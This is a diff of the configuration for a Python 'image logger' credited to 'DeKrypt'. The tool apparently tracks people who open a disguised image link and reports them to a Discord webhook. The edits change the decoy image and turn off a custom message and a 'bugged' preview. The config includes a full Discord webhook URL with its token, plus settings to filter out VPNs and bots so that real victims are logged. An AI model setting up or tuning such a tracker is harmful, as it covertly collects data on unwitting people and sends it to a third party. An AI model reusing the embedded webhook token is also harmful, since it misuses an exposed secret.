@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1473070680508727389/Z4P1t3R2vSGs0Zte_sGprU9vkfRV649fw5yWDoBnxyseHi14UlfvNovhXpEKzyjOhDIs",
-    "image": "https://ih1.redbubble.net/image.2595320116.9420/raf,360x360,075,t,fafafa:ca443f4786.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/NAU5DQazc8EAAAAe/middleclick-middleclick-for-calculator.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,8 +28,8 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "you cooked", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "message": "", # Message to show
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
